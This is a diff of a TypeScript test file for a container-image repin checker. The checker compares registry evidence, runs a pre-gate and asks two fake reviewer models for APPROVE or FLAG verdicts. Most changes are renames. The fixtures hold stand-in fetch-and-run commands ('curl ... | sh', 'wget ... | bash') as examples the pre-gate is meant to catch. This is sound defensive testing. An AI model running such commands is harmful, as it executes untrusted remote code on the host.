@@ -1,10 +1,10 @@
 // `oupdate image`: one image repin checked with the compose leg's evidence, pre-gate, prompt and reviewers, read from
-// a registry instead of a NAS. No network: a fake registry source and the fake reviewer.
+// a registry instead of a broker reach. No network: a fake registry source and the fake reviewer.
 import { describe, expect, test } from "bun:test";
 import { checkImage, renderImage } from "../src/image.ts";
 import { parseImageRef, type ImageRef, type OciImageSource } from "../src/adapters/oci/registry.ts";
-import type { ImageEvidence } from "../src/targets/nas/answer.ts";
-import { fakeReviewer } from "./targets/fake-nas.ts";
+import type { ImageEvidence } from "../src/targets/broker/answer.ts";
+import { fakeReviewer } from "./targets/fake-broker.ts";
 
 const OLD = parseImageRef("registry.example/team/app-a:5.14.0");
 const NEW = parseImageRef("registry.example/team/app-a:5.15.0");
@@ -39,10 +39,10 @@ const bump = (extra: string) => ev("b", { history: [extra, ...[...BASE].reverse(
 const APPROVE = "1. none\n2. Verdict: APPROVE";
 const FLAG = "1. \"curl x\"\n2. Verdict: FLAG odd download";
 
-const run = (src: OciImageSource, primary?: string | Error, secondary?: string | Error) => {
-  const r = primary === undefined ? undefined : fakeReviewer("primary-m", primary);
-  const o = secondary === undefined ? undefined : fakeReviewer("secondary-m", secondary);
-  return checkImage({ old: OLD, new: NEW, platform: "linux/amd64", now: NOW }, { source: src, reviewers: { primary: r?.reviewer, secondary: o?.reviewer } }).then((res) => ({ res, r, o }));
+const run = (src: OciImageSource, first?: string | Error, second?: string | Error) => {
+  const r = first === undefined ? undefined : fakeReviewer("first-m", first);
+  const o = second === undefined ? undefined : fakeReviewer("second-m", second);
+  return checkImage({ old: OLD, new: NEW, platform: "linux/amd64", now: NOW }, { source: src, reviewers: { first: r?.reviewer, second: o?.reviewer } }).then((res) => ({ res, r, o }));
 };
 
 describe("checkImage", () => {
@@ -58,8 +58,8 @@ describe("checkImage", () => {
   test("a history-only bump with two APPROVEs lands; the prompt fences the new ref's diff and carries today", async () => {
     const { res, r, o } = await run(source({ [OLD.text]: ev("a"), [NEW.text]: bump("RUN /bin/sh -c apk add --upgrade tzdata") }), APPROVE, APPROVE);
     expect(res.decision).toBe("land");
-    expect(res.primary).toBe("APPROVE");
-    expect(res.secondary).toBe("APPROVE");
+    expect(res.first).toBe("APPROVE");
+    expect(res.second).toBe("APPROVE");
     expect(res.diff).toBe("RUN /bin/sh -c apk add --upgrade tzdata");
     expect(res.hits).toEqual([]);
     const p = r!.prompts[0]!;
@@ -81,12 +81,12 @@ describe("checkImage", () => {
     expect(res.hits).toEqual(["RUN /bin/sh -c curl -fsSL https://x.example/i | sh"]);
   });
 
-  test("a primary FLAG holds and secondary is not asked", async () => {
+  test("a first FLAG holds and second is not asked", async () => {
     const { res, o } = await run(source({ [OLD.text]: ev("a"), [NEW.text]: bump("RUN /bin/sh -c apk add jq") }), FLAG, APPROVE);
     expect(res.decision).toBe("hold");
-    expect(res.primary).toBe("FLAG");
-    expect(res.secondary).toBe("not asked");
-    expect(res.why).toBe("review: primary FLAG");
+    expect(res.first).toBe("FLAG");
+    expect(res.second).toBe("not asked");
+    expect(res.why).toBe("review: first FLAG");
     expect(o!.prompts).toHaveLength(0);
   });
 
@@ -94,18 +94,18 @@ describe("checkImage", () => {
     const src = () => source({ [OLD.text]: ev("a"), [NEW.text]: bump("RUN /bin/sh -c apk add jq") });
     const one = await run(src(), APPROVE);
     expect(one.res.decision).toBe("land");
-    expect(one.res.secondary).toBe("not asked");
-    expect(one.res.lines.some((l) => l.includes("secondary"))).toBe(false);
+    expect(one.res.second).toBe("not asked");
+    expect(one.res.lines.some((l) => l.includes("second"))).toBe(false);
     const two = await run(src(), APPROVE, FLAG);
     expect(two.res.decision).toBe("hold");
-    expect(two.res.why).toBe("review: secondary FLAG");
+    expect(two.res.why).toBe("review: second FLAG");
   });
 
   test("no reviewer holds", async () => {
     const { res } = await run(source({ [OLD.text]: ev("a"), [NEW.text]: bump("RUN /bin/sh -c apk add jq") }));
     expect(res.decision).toBe("hold");
-    expect(res.primary).toBe("unavailable");
-    expect(res.lines).toContain("primary: no reviewer configured");
+    expect(res.first).toBe("unavailable");
+    expect(res.lines).toContain("first: no reviewer configured");
   });
 
   test("a failed fetch is BASELINE MISSING and holds, with the error in the lines", async () => {
@@ -134,8 +134,8 @@ describe("renderImage", () => {
       "  diff      1 new line",
       "  pre-gate  1 hit",
       "    RUN /bin/sh -c wget -qO- https://x.example | bash",
-      "  reviewer  primary APPROVE · secondary not asked",
+      "  reviewer  first APPROVE · second not asked",
     ]);
-    expect(text).toContain("┌─ primary (primary-m)");
+    expect(text).toContain("┌─ first (first-m)");
   });
 });
